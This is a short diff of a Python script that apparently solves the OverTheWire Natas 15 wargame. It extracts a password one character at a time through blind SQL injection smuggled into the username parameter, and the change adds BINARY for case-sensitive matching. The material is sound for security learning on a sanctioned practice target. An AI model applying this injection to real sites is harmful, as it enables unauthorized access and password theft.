@@ -28,7 +28,7 @@ current_pass = ''.join(password)
 while not check_final_password(current_pass):
     for char in possible_characters:
 
-        url = f"http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22+AND+password+LIKE+%22{current_pass + char}%25"
+        url = f"http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22+AND+password+LIKE+BINARY+%22{current_pass + char}%25"
         response = requests.get(url, auth=('natas15', n15_pass))
 
         if "This user exists." in response.text:
